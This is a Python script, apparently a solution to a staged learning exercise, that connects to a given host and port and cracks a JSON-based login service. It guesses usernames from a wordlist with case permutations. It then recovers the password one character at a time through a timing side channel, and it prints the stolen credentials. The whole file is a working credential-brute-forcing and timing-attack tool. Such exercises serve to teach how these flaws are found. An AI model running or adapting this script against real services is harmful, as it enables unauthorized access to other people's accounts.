import argparse
import json
import socket
from itertools import product
from pathlib import Path
from string import ascii_lowercase, ascii_uppercase, digits
from time import perf_counter
from typing import Iterator


def generated_passwords(charset: str = ascii_lowercase + digits) -> Iterator[str]:
    """stage 2"""
    for combo_len in range(1, len(charset) + 1):
        yield from map("".join, product(charset, repeat=combo_len))


def case_permutations(str_: str) -> Iterator[str]:
    """stage 3"""
    yield from map("".join, product(*zip(str_.upper(), str_.lower())))


def parse_result(response: bytes) -> str:
    """stages 4-5"""
    return json.loads(response)["result"]


def bruteforce_login(sock: socket.socket, logins: list[str]) -> str:
    """stages 4-5"""
    for login in logins:
        for variant in case_permutations(login):
            sock.send(json.dumps({"login": variant, "password": " "}).encode())
            if parse_result(sock.recv(1024)) == "Wrong password!":
                return variant
    raise LookupError


def bruteforce_password(sock: socket.socket, charset: str, login: str) -> str:
    """stages 4-5"""
    present_chars = ""
    while True:
        for char in charset:
            password = "".join((present_chars, char))
            sock.send(json.dumps({"login": login, "password": password}).encode())

            start = perf_counter()
            result = parse_result(sock.recv(1024))
            end = perf_counter()

            if result == "Connection success!":
                return password
            elif end - start > 0.1:
                present_chars = password
                break


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("host")
    parser.add_argument("port", type=int)
    args = parser.parse_args()

    # passwords = Path("passwords.txt").read_text().splitlines()
    logins = Path("logins.txt").read_text().splitlines()
    charset = ascii_lowercase + ascii_uppercase + digits

    with socket.socket() as sock:
        sock.connect((args.host, args.port))
        login = bruteforce_login(sock, logins)
        password = bruteforce_password(sock, charset, login)

    print(json.dumps({"login": login, "password": password}))
